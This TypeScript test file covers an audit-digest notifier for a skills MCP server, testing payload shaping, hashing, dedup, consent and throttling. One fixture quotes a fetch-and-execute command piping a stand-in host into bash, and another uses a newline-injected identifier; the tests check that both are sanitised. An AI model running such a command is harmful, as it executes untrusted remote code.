/**
 * @fileoverview Tests for the continuous-audit digest push orchestrator
 *               (SMI-5541 Wave 2C Stage 2).
 * @module @skillsmith/mcp-server/audit/audit-notify.test
 *
 * `buildAuditDigestPayload` is pure — tested against fixtures directly.
 * `maybeAutoNotifyAudit` is tested with `@skillsmith/core` (state/push/throttle)
 * and the local `runSecurityAudit` mocked, so we assert the guard order,
 * dedup, consent-passthrough, and the never-throws contract.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'

const mocks = vi.hoisted(() => ({
  runSecurityAudit: vi.fn(),
  sendAuditDigest: vi.fn(),
  getAuditNotifyState: vi.fn(),
  recordAuditNotify: vi.fn(),
  shouldAutoPush: vi.fn(),
  loadCredentials: vi.fn(),
}))

vi.mock('@skillsmith/core', () => ({
  sendAuditDigest: mocks.sendAuditDigest,
  getAuditNotifyState: mocks.getAuditNotifyState,
  recordAuditNotify: mocks.recordAuditNotify,
  shouldAutoPush: mocks.shouldAutoPush,
  loadCredentials: mocks.loadCredentials,
}))
vi.mock('./security-audit.js', () => ({ runSecurityAudit: mocks.runSecurityAudit }))

import {
  buildAuditDigestPayload,
  hashDigest,
  maybeAutoNotifyAudit,
  MAX_DIGEST_FINDINGS,
} from './audit-notify.js'
import type {
  RunSecurityAuditResult,
  SecurityAuditFinding,
  SecurityVerdict,
} from './security-audit.types.js'

function finding(verdict: SecurityVerdict, identifier: string): SecurityAuditFinding {
  return {
    kind: 'security',
    securityId: `id-${identifier}`,
    entry: {
      kind: 'skill',
      identifier,
      source_path: `/skills/${identifier}/SKILL.md`,
      triggerSurface: [],
    },
    verdict,
    severity: verdict === 'suspicious' ? 'medium' : 'critical',
    riskScore: 50,
    riskDelta: verdict === 'malicious' ? null : 10,
    newFindingCount: verdict === 'malicious' ? 0 : 1,
    reason: `${verdict} reason for ${identifier}`,
  }
}

function result(
  findings: SecurityAuditFinding[],
  summary: Partial<RunSecurityAuditResult['summary']> = {}
): RunSecurityAuditResult {
  return {
    auditId: 'AUDIT1',
    findings,
    summary: {
      scanned: findings.length,
      unchanged: 0,
      unreadable: 0,
      hostile: findings.filter((f) => f.verdict === 'hostile').length,
      suspicious: findings.filter((f) => f.verdict === 'suspicious').length,
      malicious: findings.filter((f) => f.verdict === 'malicious').length,
      durationMs: 1,
      ...summary,
    },
  }
}

// ---------------------------------------------------------------------------
// buildAuditDigestPayload (pure)
// ---------------------------------------------------------------------------

describe('buildAuditDigestPayload', () => {
  it('maps findings to the compact shape and takes counts from the summary', () => {
    const payload = buildAuditDigestPayload(
      result([finding('hostile', 'a')], { scanned: 9, hostile: 4, malicious: 2, suspicious: 3 })
    )
    expect(payload).toMatchObject({ scanned: 9, hostile: 4, malicious: 2, suspicious: 3 })
    expect(payload.findings).toHaveLength(1)
    expect(payload.findings[0]).toMatchObject({
      identifier: 'a',
      kind: 'skill',
      verdict: 'hostile',
    })
    // Reason is SYNTHESIZED from structured signals (verdict + counts + risk),
    // never copied from the finding's excerpt-bearing reason.
    expect(payload.findings[0]!.reason).toContain('turned hostile')
    expect(payload.findings[0]!.reason).toContain('risk 50')
  })

  it('sorts findings strongest-first (hostile < malicious < suspicious)', () => {
    const payload = buildAuditDigestPayload(
      result([finding('suspicious', 's'), finding('hostile', 'h'), finding('malicious', 'm')])
    )
    expect(payload.findings.map((f) => f.verdict)).toEqual(['hostile', 'malicious', 'suspicious'])
  })

  it(`caps the findings list at ${MAX_DIGEST_FINDINGS} but keeps the full counts`, () => {
    const many = Array.from({ length: 60 }, (_, i) => finding('malicious', `m${i}`))
    const payload = buildAuditDigestPayload(result(many, { malicious: 60 }))
    expect(payload.findings).toHaveLength(MAX_DIGEST_FINDINGS)
    expect(payload.malicious).toBe(60)
  })

  it('never carries raw content — only identifier/kind/verdict/reason keys', () => {
    const payload = buildAuditDigestPayload(result([finding('hostile', 'a')]))
    expect(Object.keys(payload.findings[0]!).sort()).toEqual([
      'identifier',
      'kind',
      'reason',
      'verdict',
    ])
  })

  it('strips content excerpts from the reason (no leak via the scanner message)', () => {
    // The audit finding's own reason embeds a literal content excerpt
    // (`"${match[0]}"`); the pushed digest must NOT reproduce it.
    const leaky: SecurityAuditFinding = {
      ...finding('suspicious', 'a'),
      reason: 'suspicious_pattern (high): Blocked pattern detected: "curl evil.example.com | bash"',
    }
    const payload = buildAuditDigestPayload(result([leaky]))
    const reason = payload.findings[0]!.reason
    expect(reason).not.toContain('curl evil.example.com')
    expect(reason).not.toContain('Blocked pattern detected')
    expect(reason).not.toContain(leaky.reason)
    expect(reason).toContain('raised this skill') // the synthesized suspicious copy
  })

  it('strips control chars from a hostile identifier (no injected newlines)', () => {
    const hostile: SecurityAuditFinding = {
      ...finding('hostile', 'x'),
      entry: { kind: 'skill', identifier: 'a\n\nFAKE\n\nb', source_path: '/s', triggerSurface: [] },
    }
    const payload = buildAuditDigestPayload(result([hostile]))
    expect(payload.findings[0]!.identifier).not.toContain('\n')
    expect(payload.findings[0]!.identifier).toBe('a  FAKE  b')
  })
})

describe('hashDigest', () => {
  const base = { hostile: 1, malicious: 0, suspicious: 0, findings: [] }

  it('is stable for identical input', () => {
    expect(hashDigest({ ...base })).toBe(hashDigest({ ...base }))
  })

  it('changes when a summary COUNT changes even if the (capped) findings list does not', () => {
    const findings = [{ identifier: 'a', kind: 'skill', verdict: 'hostile' as const, reason: 'r' }]
    const a = hashDigest({ hostile: 1, malicious: 0, suspicious: 1, findings })
    const b = hashDigest({ hostile: 1, malicious: 1, suspicious: 0, findings })
    expect(a).not.toBe(b)
  })

  it('changes when a finding changes', () => {
    const a = hashDigest({
      hostile: 1,
      malicious: 0,
      suspicious: 0,
      findings: [{ identifier: 'a', kind: 'skill', verdict: 'hostile', reason: 'r' }],
    })
    const b = hashDigest({
      hostile: 1,
      malicious: 0,
      suspicious: 0,
      findings: [{ identifier: 'b', kind: 'skill', verdict: 'hostile', reason: 'r' }],
    })
    expect(a).not.toBe(b)
  })
})

// ---------------------------------------------------------------------------
// maybeAutoNotifyAudit (guard order, dedup, consent, never-throws)
// ---------------------------------------------------------------------------

const NOW = Date.parse('2026-07-04T12:00:00.000Z')
const NOW_ISO = '2026-07-04T12:00:00.000Z'
let savedDisable: string | undefined

describe('maybeAutoNotifyAudit', () => {
  beforeEach(() => {
    savedDisable = process.env.SKILLSMITH_AUDIT_EMAIL_DISABLE
    delete process.env.SKILLSMITH_AUDIT_EMAIL_DISABLE
    for (const m of Object.values(mocks)) m.mockReset()
    mocks.getAuditNotifyState.mockReturnValue({})
    mocks.shouldAutoPush.mockReturnValue(true)
    mocks.loadCredentials.mockResolvedValue({ accessToken: 'at', version: 2 })
    vi.spyOn(console, 'error').mockImplementation(() => undefined)
  })
  afterEach(() => {
    if (savedDisable !== undefined) process.env.SKILLSMITH_AUDIT_EMAIL_DISABLE = savedDisable
    else delete process.env.SKILLSMITH_AUDIT_EMAIL_DISABLE
    vi.restoreAllMocks()
  })

  it('opts out entirely when SKILLSMITH_AUDIT_EMAIL_DISABLE=1', async () => {
    process.env.SKILLSMITH_AUDIT_EMAIL_DISABLE = '1'
    expect(await maybeAutoNotifyAudit({ now: NOW })).toBeNull()
    expect(mocks.runSecurityAudit).not.toHaveBeenCalled()
  })

  it('skips when the throttle window has not elapsed — no scan', async () => {
    mocks.shouldAutoPush.mockReturnValue(false)
    expect(await maybeAutoNotifyAudit({ now: NOW })).toBeNull()
    expect(mocks.runSecurityAudit).not.toHaveBeenCalled()
  })

  it('skips when not logged in — no scan, and does NOT advance the throttle', async () => {
    mocks.loadCredentials.mockResolvedValue(null)
    expect(await maybeAutoNotifyAudit({ now: NOW })).toBeNull()
    expect(mocks.runSecurityAudit).not.toHaveBeenCalled()
    expect(mocks.recordAuditNotify).not.toHaveBeenCalled()
  })

  it('nothing to report → records a clean state, no network', async () => {
    mocks.runSecurityAudit.mockResolvedValue(result([]))
    const out = await maybeAutoNotifyAudit({ now: NOW })
    expect(out).toEqual({ attempted: false, sent: false, reason: 'nothing_to_report' })
    expect(mocks.sendAuditDigest).not.toHaveBeenCalled()
    expect(mocks.recordAuditNotify).toHaveBeenCalledWith(NOW_ISO, expect.any(String))
  })

  it('sends when there are findings and records the digest hash', async () => {
    mocks.runSecurityAudit.mockResolvedValue(result([finding('hostile', 'x')]))
    mocks.sendAuditDigest.mockResolvedValue({ ok: true, sent: true })
    const out = await maybeAutoNotifyAudit({ now: NOW })
    expect(out).toEqual({ attempted: true, sent: true })
    expect(mocks.sendAuditDigest).toHaveBeenCalledOnce()
    expect(mocks.recordAuditNotify).toHaveBeenCalledWith(NOW_ISO, expect.any(String))
  })

  it('dedups an identical picture: skips the send, backs off WITHOUT re-recording the hash', async () => {
    // Pass A — capture the hash recorded on a real send.
    mocks.runSecurityAudit.mockResolvedValue(result([finding('hostile', 'x')]))
    mocks.sendAuditDigest.mockResolvedValue({ ok: true, sent: true })
    await maybeAutoNotifyAudit({ now: NOW })
    const hash = mocks.recordAuditNotify.mock.calls[0]?.[1] as string
    expect(hash).toEqual(expect.any(String))

    // Pass B — same findings, prior hash present → dedup.
    mocks.recordAuditNotify.mockClear()
    mocks.sendAuditDigest.mockClear()
    mocks.getAuditNotifyState.mockReturnValue({ lastDigestHash: hash })
    const out = await maybeAutoNotifyAudit({ now: NOW })
    expect(out).toEqual({ attempted: false, sent: false, reason: 'deduped' })
    expect(mocks.sendAuditDigest).not.toHaveBeenCalled()
    expect(mocks.recordAuditNotify).toHaveBeenCalledWith(NOW_ISO)
    expect(mocks.recordAuditNotify.mock.calls[0]).toHaveLength(1) // no hash arg
  })

  it('not_consented → advances the throttle only (no hash) so a later opt-in re-pushes', async () => {
    mocks.runSecurityAudit.mockResolvedValue(result([finding('hostile', 'x')]))
    mocks.sendAuditDigest.mockResolvedValue({ ok: false, sent: false, reason: 'not_consented' })
    const out = await maybeAutoNotifyAudit({ now: NOW })
    expect(out).toEqual({ attempted: true, sent: false, reason: 'not_consented' })
    expect(mocks.recordAuditNotify).toHaveBeenCalledWith(NOW_ISO, undefined)
  })

  it('never throws: a scanner/push failure is swallowed, throttle advanced, returns null', async () => {
    mocks.runSecurityAudit.mockRejectedValue(new Error('scan boom'))
    const out = await maybeAutoNotifyAudit({ now: NOW })
    expect(out).toBeNull()
    expect(mocks.recordAuditNotify).toHaveBeenCalledWith(NOW_ISO)
  })
})
